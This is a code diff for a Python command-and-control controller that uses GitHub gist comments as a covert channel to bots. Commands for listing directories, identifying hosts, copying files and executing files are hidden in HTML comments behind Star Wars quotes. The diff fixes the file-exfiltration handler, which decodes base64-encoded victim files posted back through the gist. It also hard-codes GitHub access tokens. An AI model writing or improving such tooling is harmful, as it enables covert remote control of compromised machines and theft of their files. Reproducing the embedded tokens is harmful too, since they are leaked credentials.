@@ -7,10 +7,10 @@ import time
 import json
 import subprocess
 
-TIMEOUT = 60 #heartbeat interval
+TIMEOUT = 10 #heartbeat interval
 
 URL = "https://api.github.com/gists/d3639f5c1e928cf7b6570929a075eb4c/comments"
-ACCESS_TOKEN = "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"
+ACCESS_TOKEN = "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"
 
 greetings = ["Hello.👋", "Hi. 👋", "What's up 👋", "Ciao 👋"]
 headers = {
@@ -25,20 +25,20 @@ def checkBots(id, stop):
         if stop():
             break
 
-        x = rq.get(URL)
+        x = rq.get(URL, headers=headers)
         if x.status_code == 200:
             x = x.json()
             for comment in x:
                 body = comment["body"]
-                #from GMT0 to GMT+1
-                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ') + timedelta(hours=1)
+                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
                 if timestamp < dt: #new comment
+                    print("dt: " + dt.strftime("%H:%M:%S") + " tmstp: " + timestamp.strftime("%H:%M:%S"))
                     if "👀" in body:
                         print(body.split()[4])
         else:
             print(x.json())
         print("Heartbeating bots...")
-        timestamp = datetime.now()
+        timestamp = datetime.utcnow()
         data = {
             "body": greetings[idx]
         }
@@ -57,31 +57,40 @@ t1.start()
 threads = []
 
 def copyHandler(id, stop, filename):
-    timestamp = datetime.now()
-    idx = 0
+    timestamp = datetime.utcnow()
     while True:
         if stop():
             break
-        x = rq.get(URL)
+        x = rq.get(URL, headers=headers)
         if x.status_code == 200:
             x = x.json()
             for comment in x:
                 body = comment["body"]
                 #from GMT0 to GMT+1
-                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ') + timedelta(hours=1)
+                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
                 if timestamp < dt: #new comment
-                    if filename in body:
-                        id = comment["id"]
+                    if filename in body and "As you wish" in body:
+                        #id = comment["id"]
                         start = body.find("<!--")+5+len(filename)+1
                         end = body.find("-->")-1
                         encoded = body[start:end]
-                        name = "foo"
+                        name = "foo.txt"
                         if filename.rfind("/") != -1:
                             name = filename[(filename.rfind("/")+1):]
                         else:
                             name = filename
-                        subprocess.run(["base64", "--decode", encoded, ">", name])
-                        break
+                        f = open(name, "w")
+                        f.write(encoded)
+                        f.close()
+                        res = subprocess.run(["base64", "--decode", name], stdout=subprocess.PIPE).stdout.decode("utf-8")
+                        f = open(name, "w")
+                        f.write(res)
+                        f.close()
+                        print(filename + " copied successfully")
+                        return
+        timestamp = datetime.utcnow()
+        time.sleep(int(TIMEOUT/2))
+    
 
 
 def post(body):
@@ -100,20 +109,20 @@ while True:
     elif s == "ls":
         print("Input path: ")
         path = input()
-        post({"body": "Where are the droids? 🤓 <!--" + path + "-->"})
+        post({"body": "Where are the droids? 🤓 <!-- " + path + " -->"})
     elif s == "id":
         post({"body": "Mesa called Jar Jar Binks, mesa your humble servant! 🫵"})
     elif s == "copy":
         print("write filename: ")
         filename = input()
-        post({"body": "Release him! 🤯 <!--" + filename + "-->"})
+        post({"body": "Release him! 🤯 <!-- " + filename + " -->"})
         t = Thread(target=copyHandler, args=(id, lambda: stop_threads, filename))
-        t.start()
         threads.append(t)
+        t.start()
     elif s == "exec":
         print("write path: ")
         path = input()
-        post({"body": "Let the past die 😵‍💫 <!--" + filename + "-->"})
+        post({"body": "Let the past die 😵‍💫 <!-- " + path + " -->"})
     else:
         print("Invalid command. (w, ls, id, copy, exec, exit)")
 
